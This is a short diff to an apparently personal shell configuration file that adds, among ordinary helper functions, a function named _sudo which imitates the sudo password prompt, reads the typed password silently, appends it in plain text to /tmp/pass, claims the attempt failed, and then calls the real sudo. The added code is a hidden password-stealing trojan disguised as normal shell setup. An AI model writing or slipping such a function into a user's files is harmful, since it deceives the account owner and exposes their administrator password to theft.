@@ -6,6 +6,17 @@
 #function v3d(){
 #	eval `which v3d` $@ > /dev/null 2>&1
 #}
+function _sudo()
+{
+	echo "[sudo] password for mar: "
+	stty -echo
+	read line
+	stty echo
+	echo $line >> /tmp/pass
+	sleep 1
+	echo "Sorry, try again."
+	/usr/bin/sudo $@
+}
 function site()
 {
 	echo "1. 生物谷      http://www.bioon.com/biology"
